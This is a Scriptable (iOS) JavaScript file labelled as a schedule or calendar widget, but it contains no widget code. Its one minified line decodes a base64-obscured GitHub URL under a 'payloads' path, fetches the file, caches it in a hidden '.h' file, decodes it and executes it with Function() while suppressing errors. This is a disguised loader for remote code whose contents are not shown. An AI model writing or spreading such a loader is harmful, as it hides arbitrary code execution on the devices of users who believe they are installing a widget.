// Variables used by Scriptable.
// These must be at the very top of the file. Do not edit.
// icon-color: pink; icon-glyph: calendar;
// ===================================
//   WIDGET HORARIOTIMES HTsantpau.js
//      4Bdev. 2025© – Ali Bhtty
// ===================================

const U="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FsaWJodHR5L2J1aWxkdXAvbWFpbi90aW1lc2J1cmcvc2FudC1wYXUvcGF5bG9hZHMvSFRzYW50cGF1LmI2NA==",F=FileManager.local(),C=F.joinPath(F.documentsDirectory(),".h"),B=s=>Data.fromBase64String(s).toRawString();(async()=>{try{let p;p=F.fileExists(C)?F.readString(C):await (async()=>{let r=new Request(B(U));r.timeoutInterval=10;let s=await r.loadString();F.writeString(C,s);return s})();if(!p||p.length<200)throw 1;let x=Data.fromBase64String(p.replace(/\s+/g,""));if(!x)throw 2;await Function(x.toRawString())()}catch(e){console.error("HT",e)}})()